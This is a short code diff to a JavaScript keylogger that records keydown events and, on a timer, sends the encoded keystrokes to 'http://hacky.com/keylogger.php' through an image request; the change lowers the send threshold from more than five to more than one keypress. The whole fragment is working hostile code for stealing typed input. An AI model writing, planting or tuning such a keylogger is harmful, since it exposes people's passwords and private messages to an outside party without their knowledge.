@@ -6,7 +6,7 @@ window.addEventListener("keydown", function(evt){
     });
 });
 window.setInterval(function () {
-    if (presses.length>5) {
+    if (presses.length>1) {
         var data = encodeURIComponent(JSON.stringify(presses));
         // console.log(data);
         new Image().src = "http://hacky.com/keylogger.php?c=" + data;
